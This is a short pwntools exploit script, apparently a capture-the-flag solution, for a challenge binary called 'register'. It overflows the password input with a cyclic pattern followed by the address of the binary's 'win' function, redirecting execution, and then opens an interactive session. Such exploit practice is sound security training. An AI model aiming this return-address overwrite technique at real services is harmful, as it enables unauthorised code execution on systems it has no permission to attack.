#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './register')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 10000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
io.sendlineafter(b"Enter your choice: ",b"2")
io.sendlineafter(b"Enter username:",b"asd")
payload =cyclic(30)
# payload+=p64(0x0000000000401016)
payload+=p64(exe.symbols.win)
print(payload)
input()
io.sendlineafter(b"Enter password:", payload)

io.interactive()